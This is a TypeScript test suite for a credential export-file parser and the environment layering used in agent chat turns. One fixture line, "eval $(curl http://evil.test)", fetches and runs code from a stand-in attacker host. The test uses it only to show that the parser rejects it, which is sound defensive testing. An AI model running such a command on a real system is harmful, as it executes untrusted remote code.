import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { ActorService, Subscriber } from "../src/actor.js";
import { ChatSessionStore } from "../src/chat-session.js";
import { CredentialSource, parseCredentialExportFile } from "../src/credentials.js";
import type { AgentAdapter, Provider } from "../src/types.js";
import type { ConnectionIdentity } from "../src/auth.js";

/**
 * The workspace's own variables arrive as a shell export file in
 * `<state>/creds/env.d`, and a chat turn was once the one participant in the
 * box that could not read them: login shells source the glob through
 * /etc/profile.d/blitz-creds.sh, the actor read only `env/environment.json`.
 * These pin the decoder against the exact bytes the Go writer emits
 * (`environmentFile`/`shellQuote` in
 * packages/broker/internal/workspace/environment.go) and the layering against
 * the order the shell glob applies.
 *
 * No connection secret is here. An agent pulls one when it needs one.
 */

const directories: string[] = [];
const originalPath = process.env.PATH;

afterEach(() => {
  process.env.PATH = originalPath;
  for (const directory of directories.splice(0)) {
    rmSync(directory, { recursive: true, force: true });
  }
});

function stateDir(): string {
  const directory = mkdtempSync(join(tmpdir(), "blitz-creds-env-"));
  directories.push(directory);
  return directory;
}

/** `shellQuote` from cp.go, so the corpus below is the writer's own output and
 * not a hand-drawn imitation of it. */
function shellQuote(value: string): string {
  return `'${value.replaceAll("'", `'"'"'`)}'`;
}

function exportLine(name: string, value: string): string {
  return `export ${name}=${shellQuote(value)}\n`;
}

/** Writes one env.d entry the way the broker does. */
function writeEnvFile(directory: string, file: string, lines: string[]): void {
  const envDir = join(directory, "creds", "env.d");
  mkdirSync(envDir, { recursive: true });
  writeFileSync(join(envDir, file), lines.join(""));
}

function writeWorkspaceEnvironment(directory: string, env: Record<string, string>): void {
  mkdirSync(join(directory, "env"), { recursive: true });
  writeFileSync(
    join(directory, "env", "environment.json"),
    JSON.stringify({ env, startupScript: null, filesReady: true }),
  );
}

describe("credential export file decoding", () => {
  it("reads the plain export lines the broker writes", () => {
    expect(parseCredentialExportFile(exportLine("PROJECT_MODE", "analysis") + exportLine("REGION", "eu"))).toEqual([
      { name: "PROJECT_MODE", value: "analysis" },
      { name: "REGION", value: "eu" },
    ]);
  });

  it("unescapes a value carrying single quotes the way shellQuote escaped it", () => {
    // The close-quote-a-quote-reopen dance, which a naive split on ' would
    // shred into three variables and a syntax error.
    const source = exportLine("MOTTO", "it's a 'quoted' token");
    expect(source).toBe(`export MOTTO='it'"'"'s a '"'"'quoted'"'"' token'\n`);
    expect(parseCredentialExportFile(source)).toEqual([
      { name: "MOTTO", value: "it's a 'quoted' token" },
    ]);
    // A value that is nothing but a quote is the degenerate case: the escape
    // sits flush against both delimiters.
    expect(parseCredentialExportFile(exportLine("ONE", "'"))).toEqual([
      { name: "ONE", value: "'" },
    ]);
  });

  it("skips an unset line, which the writer no longer emits", () => {
    // Tombstones went with the delivery pipeline. A file that still carried
    // one would have drifted from the writer, so the safe read is to drop it.
    expect(parseCredentialExportFile(`${exportLine("KEPT", "yes")}unset RETRACTED\n`)).toEqual([
      { name: "KEPT", value: "yes" },
    ]);
  });

  it("skips a line it cannot read and keeps the credentials around it", () => {
    const source = [
      exportLine("BEFORE", "1"),
      "export 9INVALID='x'\n",
      "eval $(curl http://evil.test)\n",
      "export UNTERMINATED='oops\n",
      exportLine("AFTER", "2"),
    ].join("");
    expect(parseCredentialExportFile(source)).toEqual([
      { name: "BEFORE", value: "1" },
      { name: "AFTER", value: "2" },
    ]);
  });

  it("carries values holding =, spaces and newlines through intact", () => {
    const connection = "postgres://u:p@host:5432/db?sslmode=require";
    const pem = "-----BEGIN KEY-----\nline one\nline two\n-----END KEY-----";
    expect(parseCredentialExportFile(exportLine("DATABASE_URL", connection)
      + exportLine("GREETING", "  two  words  ")
      + exportLine("SERVICE_KEY", pem))).toEqual([
      { name: "DATABASE_URL", value: connection },
      { name: "GREETING", value: "  two  words  " },
      { name: "SERVICE_KEY", value: pem },
    ]);
  });
});

describe("credential environment layering", () => {
  it("applies env.d in glob order over the workspace variables and the process env", async () => {
    const directory = stateDir();
    writeWorkspaceEnvironment(directory, { PROJECT_MODE: "analysis", REGION: "eu" });
    writeEnvFile(directory, "00-workspace.sh", [
      exportLine("PROJECT_MODE", "analysis"),
      exportLine("REGION", "eu"),
    ]);

    const environment = await new CredentialSource(directory).environment();
    expect(environment.PROJECT_MODE).toBe("analysis");
    expect(environment.REGION).toBe("eu");
    // The actor's own environment stays underneath both layers.
    expect(environment.PATH).toBe(process.env.PATH);
  });

  it("carries no connection secret, because none is delivered", async () => {
    // A turn used to inherit every connected provider's token. An agent now
    // asks for one when it needs one, so a leaked transcript of the turn's
    // environment holds nothing to rotate.
    const directory = stateDir();
    writeWorkspaceEnvironment(directory, { PROJECT_MODE: "analysis" });
    writeEnvFile(directory, "00-workspace.sh", [exportLine("PROJECT_MODE", "analysis")]);

    const environment = await new CredentialSource(directory).environment();
    expect("GH_TOKEN" in environment).toBe(false);
    expect("LINEAR_API_KEY" in environment).toBe(false);
  });

  it("degrades to the workspace variables alone when env.d is absent", async () => {
    const directory = stateDir();
    writeWorkspaceEnvironment(directory, { PROJECT_MODE: "analysis" });
    const environment = await new CredentialSource(directory).environment();
    expect(environment.PROJECT_MODE).toBe("analysis");
    expect(environment.PATH).toBe(process.env.PATH);
  });

  it("degrades rather than throwing when env.d is unreadable", async () => {
    const directory = stateDir();
    // A directory the process cannot list is the same answer as no directory:
    // no credentials, and a turn that still runs.
    mkdirSync(join(directory, "creds", "env.d"), { recursive: true });
    chmodSync(join(directory, "creds", "env.d"), 0o000);
    try {
      await expect(new CredentialSource(directory).environment())
        .resolves.toMatchObject({ PATH: process.env.PATH });
    } finally {
      chmodSync(join(directory, "creds", "env.d"), 0o700);
    }
  });
});

/** Records the order the turn touches the credential source in. Both calls are
 * overridden rather than spied so the suite never shells out. */
class OrderedCredentials extends CredentialSource {
  public readonly calls: string[] = [];

  public override async token(_provider: Provider): Promise<string | null> {
    this.calls.push("token");
    return null;
  }

  public override async environment(): Promise<NodeJS.ProcessEnv> {
    this.calls.push("environment");
    return {};
  }
}

const owner: ConnectionIdentity = { userId: "u", membershipId: "m", role: "owner" };

describe("the turn reads the environment once", () => {
  it("mints the harness login before it reads the environment", async () => {
    const directory = stateDir();
    const store = new ChatSessionStore(join(directory, "chat-session.db"));
    const credentials = new OrderedCredentials(directory);
    const adapter: AgentAdapter = {
      runTurn: () => Promise.resolve({ stopReason: "end_turn" as const }),
    };
    const service = new ActorService(store, credentials, () => adapter, "claude");
    const subscriber = new Subscriber("sub", owner, () => undefined);
    try {
      const session = await service.newSession("/workspace", subscriber);
      await service.prompt(session, [{ type: "text", text: "hello" }], subscriber);
    } finally {
      store.close();
    }
    // A turn that abandons ship over the harness login must not pay for the
    // environment read first.
    expect(credentials.calls).toEqual(["token", "environment"]);
  });
});
